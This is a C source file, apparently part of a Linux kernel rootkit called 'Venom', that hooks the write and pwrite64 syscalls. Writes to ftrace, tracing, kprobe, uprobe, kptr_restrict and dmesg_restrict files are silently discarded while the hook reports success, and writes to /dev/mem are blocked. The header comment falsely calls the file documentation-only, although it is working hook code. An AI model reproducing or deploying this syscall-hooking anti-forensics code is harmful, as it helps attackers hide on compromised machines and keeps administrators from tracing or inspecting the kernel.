/* 
 * Venom 
 * ---------------------------------------------------------------------------
 * File: write.c
 *
 * Purpose:
 *  - Conceptual discussion of the write(2) syscall, its interaction with
 *    logging/tracing subsystems, and how output interception might appear
 *    in system logs or forensic evidence. Hooks write, pwrite 
 *
 * Contents (documentation-only):
 *  - Prevents ftrace modifications, protects the system, logging
 * 
 * Author: Trevohack 
 */


#ifndef WRITE_HACK_H
#define WRITE_HACK_H 


#include "../include/headers.h" 


static asmlinkage ssize_t (*orig_write)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pwrite64)(const struct pt_regs *regs);



static const char *write_protected_files[] = {
    "ftrace_enabled",
    "tracing_on",
    "trace",
    "available_tracers",
    "current_tracer",
    "set_ftrace_filter",
    "set_ftrace_notrace",
    "kptr_restrict",
    "dmesg_restrict",
    NULL
};


notrace static int custos_write(const char *name) {
    int i;
    if (!name) return 0;
    
    for (i = 0; write_protected_files[i] != NULL; i++) {
        if (strcmp(name, write_protected_files[i]) == 0)
            return 1;
    }

    if (strstr(name, "trace") || strstr(name, "events") || 
        strstr(name, "kprobe") || strstr(name, "uprobe"))
        return 1;
    
    return 0;
}


notrace static char *get_file_path(int fd, char *buf, size_t size) {
    struct file *file;
    char *path = NULL;
    
    file = fget(fd);
    if (file) {
        path = d_path(&file->f_path, buf, size);
        fput(file);
    }
    
    return IS_ERR(path) ? NULL : path;
}


notrace static ssize_t write_vigila(int fd, const char __user *user_buf, size_t count,
                           loff_t *pos, ssize_t (*original_write)(const struct pt_regs *),
                           const struct pt_regs *regs) {
    struct file *file;
    char *kernel_buf;
    char path_buf[256];
    char *path;
    
    file = fget(fd);
    if (!file)
        goto call_original;
    
    if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
        const char *name = file->f_path.dentry->d_name.name;
        

        if (custos_write(name)) {
            fput(file);
            
            kernel_buf = kmalloc(min(count, (size_t)BUFFER_SIZE), GFP_KERNEL);
            if (kernel_buf) {
                if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUFFER_SIZE)) == 0) {
                    kernel_buf[min(count, (size_t)BUFFER_SIZE - 1)] = '\0';
                    TLOG_WARN("[VENOM] Blocked write to %s: %.*s by %s", name, (int)min(count, (size_t)64), kernel_buf, current->comm);
                }
                kfree(kernel_buf);
            }
            
            return count; 
        }
        
        path = get_file_path(fd, path_buf, sizeof(path_buf));
        if (path) {
            if (strstr(path, "/etc/") || 
                strstr(path, "/boot/") ||
                strstr(path, "/sys/kernel/")) {
                TLOG_INF("[VENOM] System file write: %s by %s (PID:%d)", path, current->comm, current->pid);
            }
            

            if (strstr(path, "/dev/mem") || strstr(path, "/dev/kmem")) {
                TLOG_CRIT("[VENOM] MEMORY WRITE ATTEMPT: %s by %s", path, current->comm);
                fput(file);
                return 0; 
            }
        }
    }
    
    fput(file);
    
call_original:
    return original_write(regs);
}

notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
    int fd = regs->di;
    const char __user *buf = (const char __user *)regs->si;
    size_t count = regs->dx;
    
    return write_vigila(fd, buf, count, NULL, orig_write, regs);
}


notrace static asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs) {
    int fd = regs->di;
    const char __user *buf = (const char __user *)regs->si;
    size_t count = regs->dx;
    loff_t pos = regs->r10;
    
    return write_vigila(fd, buf, count, &pos, orig_pwrite64, regs);
}

#endif 
